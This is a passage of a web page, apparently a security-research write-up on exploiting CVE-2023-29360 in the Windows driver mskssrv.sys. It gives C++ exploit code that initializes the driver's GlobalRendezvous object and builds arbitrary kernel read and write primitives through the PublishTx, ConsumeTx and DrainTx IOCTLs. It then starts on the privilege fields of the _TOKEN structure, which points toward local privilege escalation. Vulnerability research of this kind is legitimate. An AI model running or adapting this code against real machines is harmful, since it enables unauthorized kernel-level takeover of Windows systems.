</span></span><span class="highlight-line"><span class="highlight-line-content">    NTSTATUS status = -1;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    status = DeviceIoControl(hDevice, ioctl_code, buffer, buffer_len, OutBuffer, out_buffer_len,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">                             nullptr, nullptr)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><h3 id="step-2-create-globalrendezvous" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360#step-2-create-globalrendezvous"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_ab8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_ab8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Step 2 : Create GlobalRendezvous</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">To create a MDL, we need to use <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">PublishTx</code> function in mskssrv. While reversing the driver, we found that there is a global variable called FSInitializeContextRendezvous that needs to be initialized before anything is executed.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">While reversing, we see that there is a global Rendezvous object that is being checked before any operation. So in order to perform any operation, we need to initialize the GlobalRendezvous object.</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FUY1Bjjiublp395hHxSvT%252Fimage.png%3Falt%3Dmedia%26token%3D713870de-fc7d-41b3-8c3c-a45dde080ccd&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=86e28303&amp;sv=2" width="461" height="196"></div><figcaption class="text-xs text-center text-tint mt-2">Check for GlobalRendezvous object</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The below code would initialize the GlobalRendezvous object.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2l8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">bool Bug::InitializeGlobalRendezvous() {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    auto* stream_data = static_cast&lt;_FSStreamRegInfo*&gt;(malloc(sizeof(_FSStreamRegInfo)));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    memset(stream_data, 0x0, sizeof(_FSStreamRegInfo));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    HANDLE hEvent = CreateEvent(nullptr, NULL, NULL, nullptr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    stream_data-&gt;ObjectHandle = hEvent;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    stream_data-&gt;q2 = GetCurrentProcessId();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    stream_data-&gt;q1 = 0x5;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    stream_data-&gt;f2 = 0x50;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    stream_data-&gt;q5 = 0x20000;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    stream_data-&gt;q3 = 1;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    SendDataToDriver(0x2f0400, stream_data, sizeof(_FSStreamRegInfo);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><h3 id="step-3-read-primitive" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360#step-3-read-primitive"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_an8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_an8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Step 3 : Read Primitive </div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The below execution flow is used to create a read primitive. </p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2r8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">uint64_t ReadPrimitive(uint64_t where) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Initialize Stream<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    bool status = false;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (poc::once) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        poc_.InitializeStream();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // PublishTx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    status = poc_.PublishTx(where);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // Register Stream<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (poc::once) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        poc_.RegisterStream();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        poc::once = false;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // ConsumeTx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    poc_.ConsumeTx();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // DrainTx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    poc_.DrainTx();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    return *reinterpret_cast&lt;uint64_t*&gt;(poc_.GetMappedAddr());<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">We first initialize a stream. There would be a single stream binded to a device handle. This implies that we need to execute <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">InitializeStream</code> and <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">RegisterStream</code> once per device handle. Refer to the exploit code on how to create such requests. </p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">PublishTx</code> function is responsible for creating a MDL with arbitrary virtual address while <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">ConsumeTx</code> function is responsible for mapping the virtual address stored in the MDL in the user process creating the driver call. Note that we need both <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">VirtualAddress1</code> and <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">VirtualAddress2</code> for the IOCTL code to work. </p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Another thing to note here is that we pass <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">0xffffffff00000008</code> as the value for the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">switch_case</code> variable. This variable is used to direct the flow to right switch branch along with a controlled value over Priority field for mapping.</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FWLIv0OHRkOJozas4VMVk%252Fimage.png%3Falt%3Dmedia%26token%3Dc51867de-8e12-4f5e-95e3-81c0ab976d23&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=ee372a70&amp;sv=2" width="809" height="212"></div><figcaption class="text-xs text-center text-tint mt-2">ConsumeTx</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The switch_case value passed to <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">PublishTx</code> is accessed in <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">ConsumeTx</code> when the MDL is about to be mapped inside the user address space. </p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">For a value of <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">0xffffffff00000008</code>, the switch_case branches out on the 32 bit LSB which in our case is 8. The priority on other hand is decided by full 64 bit value which after computation becomes <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">0x40000010</code> which is OR operation of <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">MdlMappingNoExecute | NormalPagePriority</code> which implies that the page is mapped for write operations as well.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Refer to the exploit code on how to create requests for ConsumeTx, PublishTx and DrainTx.</p><h3 id="step-4-write-primitive" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360#step-4-write-primitive"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_bb8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_bb8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Step 4 : Write Primitive</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The below execution flow allows for write primitive :-</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_3f8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">void WritePrimitive(uint64_t What, uint64_t Where) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    // PublishTx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    poc_.PublishTx(Where);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // ConsumeTx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    poc_.ConsumeTx();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    // DrainTx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    poc_.DrainTx();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    *reinterpret_cast&lt;uint64_t*&gt;(poc_.GetMappedAddr()) = What;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">We don't execute <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">InitializeStream</code> and <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">RegisterStream</code> since by the time it reaches the Write Primitive, read primitive would be executed first and the mentioned functions would already be executed. </p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">We use the same technique that we used for Read Primitive since the address is mapped with read and write.</p><h3 id="token-structure" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360#token-structure"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_bl8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_bl8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">_TOKEN structure </div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The token structure contains fields from 0x40 that indicate the privileges associated with the token. </p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_3p8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">+0x40 Present          : Uint8B<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">+0x48 Enabled          : Uint8B<!-- -->
